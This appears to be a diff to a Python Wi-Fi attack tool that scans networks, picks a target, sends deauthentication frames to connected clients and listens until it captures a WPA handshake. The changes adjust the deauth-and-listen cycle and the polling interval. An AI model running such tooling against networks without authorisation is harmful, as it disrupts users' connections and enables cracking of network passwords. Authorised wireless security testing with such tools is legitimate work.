@@ -493,22 +493,28 @@ class HandshakeCapture:
                 time.sleep(1)
 
     def listen_cycle(self):
-        """Listen for handshakes for 1 minute"""
+        """Listen for handshakes and stop when captured"""
         end_time = time.time() + 60  # 1 minute of listening
 
         with Progress() as progress:
             task = progress.add_task("[cyan]Listening for handshakes...", total=60)
             
             while time.time() < end_time and self.running and not self.handshake_captured:
-                # Check for handshake
+                # Check for handshake every 2 seconds
                 if os.path.exists(f"{self.capture_file}-01.cap"):
                     if self.verify_handshake():
                         self.handshake_captured = True
                         self.console.print("\n[green]✓ WPA handshake successfully captured![/green]")
                         return True
+                    
+                    # Check if clients are still connected
+                    clients = self.get_connected_clients()
+                    if not clients:
+                        self.console.print("\n[yellow]No clients currently connected. Resuming deauth cycle...[/yellow]")
+                        return False
                 
-                progress.update(task, advance=1)
-                time.sleep(1)
+                progress.update(task, advance=2)
+                time.sleep(2)  # Check every 2 seconds instead of 1
             
             return False
 
@@ -553,7 +559,7 @@ class HandshakeCapture:
             return False
 
     def start_capture(self):
-        """Start the handshake capture process"""
+        """Start the handshake capture process with improved cycle management"""
         if not self.check_dependencies():
             return
 
@@ -575,7 +581,7 @@ class HandshakeCapture:
             self.console.print("[red]No networks found![/red]")
             return
 
-        # Display found networks and get target selection
+        # Display and select target network (keeping existing code)
         self.console.print("\n[green]Networks found:[/green]")
         table = Table(show_header=True, header_style="bold magenta")
         table.add_column("#", style="dim")
@@ -644,7 +650,9 @@ class HandshakeCapture:
                 if clients:
                     self.console.print(f"[green]Found {len(clients)} connected clients[/green]")
                 else:
-                    self.console.print("[yellow]No clients currently connected, using broadcast deauth[/yellow]")
+                    self.console.print("[yellow]No clients currently connected, waiting for clients...[/yellow]")
+                    time.sleep(5)  # Wait briefly before checking again
+                    continue
                 
                 # Deauth phase
                 self.send_deauth_cycle(clients)
@@ -652,11 +660,12 @@ class HandshakeCapture:
                 if self.handshake_captured:
                     break
                 
-                # Listen phase
+                # Listen phase - now returns True if handshake captured, False to continue cycle
                 if self.listen_cycle():
                     break
                 
                 cycle_count += 1
+                self.console.print("[yellow]No handshake captured yet, starting new cycle...[/yellow]")
             
             capture_process.terminate()
             
